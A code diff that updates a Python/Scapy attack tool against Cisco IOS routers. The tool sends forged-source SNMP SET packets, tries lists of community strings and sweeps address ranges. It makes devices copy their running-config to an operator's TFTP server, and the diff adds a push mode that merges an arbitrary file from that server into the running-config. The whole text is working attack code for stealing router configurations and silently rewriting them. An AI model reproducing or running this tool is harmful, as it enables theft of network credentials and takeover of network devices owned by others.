@@ -30,18 +30,26 @@ from scapy.asn1.asn1 import ASN1_OID, ASN1_IPADDRESS
 from scapy.layers.inet import IP, UDP
 from scapy.sendrecv import send
 
-VERSION = "v1.0.0"
+VERSION = "v1.1.0"
 
 
-def send_snmp(layer34, community, tftpserver):
-    """Send 7 SNMP SET packets to trigger a Cisco IOS config TFTP transfer."""
-    s1 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.14.112"), value=6)]))
-    s2 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.2.112"), value=1)]))
-    s3 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.3.112"), value=4)]))
-    s4 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.4.112"), value=1)]))
-    s5 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.5.112"), value=ASN1_IPADDRESS(tftpserver))]))
-    s6 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.6.112"), value="cisco-config.txt")]))
-    s7 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.9.96.1.1.1.1.14.112"), value=1)]))
+def send_snmp(layer34, community, tftpserver, filename="cisco-config.txt", push=False):
+    """Send 7 SNMP SET packets to trigger a Cisco IOS config TFTP transfer.
+
+    pull (default): device uploads running-config to TFTP server
+    push:           device pulls file from TFTP server and merges into running-config
+    """
+    base = "1.3.6.1.4.1.9.9.96.1.1.1.1"
+    row = 113 if push else 112
+    src_type = 1 if push else 4  # networkFile when pushing, runningConfig when pulling
+    dst_type = 4 if push else 1  # runningConfig when pushing, networkFile when pulling
+    s1 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.14.{row}"), value=6)]))
+    s2 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.2.{row}"), value=1)]))
+    s3 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.3.{row}"), value=src_type)]))
+    s4 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.4.{row}"), value=dst_type)]))
+    s5 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.5.{row}"), value=ASN1_IPADDRESS(tftpserver))]))
+    s6 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.6.{row}"), value=filename)]))
+    s7 = SNMP(community=community, PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID(f"{base}.14.{row}"), value=1)]))
     send(layer34 / s1, verbose=0)
     send(layer34 / s2, verbose=0)
     send(layer34 / s3, verbose=0)
@@ -77,18 +85,20 @@ def generate_random_ip(srcip, srcmask):
     return socket.inet_ntoa(struct.pack("!L", result))
 
 
-def run_single(srcip, dstip, communities, tftpserver, outpath, verbose):
+def run_single(srcip, dstip, communities, tftpserver, outpath, verbose,
+                push=False, filename="cisco-config.txt"):
     """Single target IP, one or more community strings."""
     layer34 = IP(src=srcip, dst=dstip) / UDP(sport=161, dport=161)
     for c in communities:
         if verbose:
             print(f"{dstip} /  {c}")
-        send_snmp(layer34, c, tftpserver)
-        if outpath and check_file(outpath):
+        send_snmp(layer34, c, tftpserver, filename=filename, push=push)
+        if not push and outpath and check_file(outpath):
             return
 
 
-def run_randmask(srcip, dstip, srcmask, communities, tftpserver, outpath, verbose):
+def run_randmask(srcip, dstip, srcmask, communities, tftpserver, outpath, verbose,
+                  push=False, filename="cisco-config.txt"):
     """Random IP sweep within mask, one or more community strings."""
     while True:
         tmpip = generate_random_ip(srcip, srcmask)
@@ -98,12 +108,13 @@ def run_randmask(srcip, dstip, srcmask, communities, tftpserver, outpath, verbos
                 print(f"{tmpip} /  {c}")
             else:
                 print(tmpip)
-            send_snmp(layer34, c, tftpserver)
-            if check_file(outpath):
+            send_snmp(layer34, c, tftpserver, filename=filename, push=push)
+            if not push and check_file(outpath):
                 return
 
 
-def run_seqmask(srcip, dstip, srcmask, communities, tftpserver, outpath, verbose):
+def run_seqmask(srcip, dstip, srcmask, communities, tftpserver, outpath, verbose,
+                 push=False, filename="cisco-config.txt"):
     """Sequential IP sweep within mask, one or more community strings."""
     src_long = struct.unpack("!L", socket.inet_aton(srcip))[0]
     mask_long = struct.unpack("!L", socket.inet_aton(srcmask))[0]
@@ -118,16 +129,17 @@ def run_seqmask(srcip, dstip, srcmask, communities, tftpserver, outpath, verbose
                     print(f"{tmpip} /  {c}")
                 else:
                     print(tmpip)
-                send_snmp(layer34, c, tftpserver)
-                if check_file(outpath):
+                send_snmp(layer34, c, tftpserver, filename=filename, push=push)
+                if not push and check_file(outpath):
                     return
         if seq_long < mask_long:
             seq_long += 1
         else:
             break
-    if check_file(outpath):
-        return
-    wait_and_check(outpath)
+    if not push:
+        if check_file(outpath):
+            return
+        wait_and_check(outpath)
 
 
 def build_parser():
@@ -145,11 +157,15 @@ def build_parser():
             sub.add_argument("community", metavar="community-string")
         sub.add_argument("tftpserver", metavar="tftp-server-ip")
         sub.add_argument("srcip", metavar="source-ip")
+        sub.add_argument("--push", action="store_true", default=False,
+                         help="Push config TO device (merge into running-config) instead of pulling")
+        sub.add_argument("--filename", metavar="tftp-filename", default="cisco-config.txt",
+                         help="Filename on TFTP server (default: cisco-config.txt)")
 
     def add_mask_args(sub):
         sub.add_argument("srcmask", metavar="source-mask")
         sub.add_argument("dstip", metavar="destination-ip")
-        sub.add_argument("tftproot", metavar="tftp-root-path")
+        sub.add_argument("tftproot", metavar="tftp-root-path", nargs="?", default=None)
 
     # single
     p = subparsers.add_parser("single", help="Single IP, single community string")
@@ -199,6 +215,11 @@ def main():
         communities = [args.community]
 
     # Echo configuration
+    if args.push:
+        print(f"Mode:              PUSH (merge config to device)")
+        print(f"TFTP Filename:     {args.filename}")
+    else:
+        print(f"Mode:              PULL (download config from device)")
     if args.mode.endswith("_l"):
         print(f"Community File:    {args.community_file}")
     else:
@@ -209,17 +230,17 @@ def main():
         print(f"Source Mask:       {args.srcmask}")
     print(f"Destination IP:    {args.dstip}")
 
-    # Determine output path
+    # Determine output path (pull mode only)
     outpath = ""
-    if hasattr(args, "tftproot"):
-        outpath = args.tftproot + os.sep + "cisco-config.txt"
+    if not args.push and hasattr(args, "tftproot") and args.tftproot:
+        outpath = args.tftproot + os.sep + args.filename
         print(f"TFTP Root Path:    {outpath}")
 
     if args.mode.endswith("_l"):
         print(f"Community strings loaded: {communities}")
 
-    # Check for existing output file
-    if outpath and os.path.isfile(outpath):
+    # Check for existing output file (pull mode only)
+    if not args.push and outpath and os.path.isfile(outpath):
         print("Target file already exists, delete or move the following file and try again")
         print(outpath)
         sys.exit(1)
@@ -229,11 +250,14 @@ def main():
     verbose = args.mode.endswith("_l")
 
     if base_mode == "single":
-        run_single(args.srcip, args.dstip, communities, args.tftpserver, outpath, verbose)
+        run_single(args.srcip, args.dstip, communities, args.tftpserver, outpath, verbose,
+                   push=args.push, filename=args.filename)
     elif base_mode == "randmask":
-        run_randmask(args.srcip, args.dstip, args.srcmask, communities, args.tftpserver, outpath, verbose)
+        run_randmask(args.srcip, args.dstip, args.srcmask, communities, args.tftpserver, outpath, verbose,
+                     push=args.push, filename=args.filename)
     elif base_mode == "seqmask":
-        run_seqmask(args.srcip, args.dstip, args.srcmask, communities, args.tftpserver, outpath, verbose)
+        run_seqmask(args.srcip, args.dstip, args.srcmask, communities, args.tftpserver, outpath, verbose,
+                    push=args.push, filename=args.filename)
 
 
 if __name__ == "__main__":
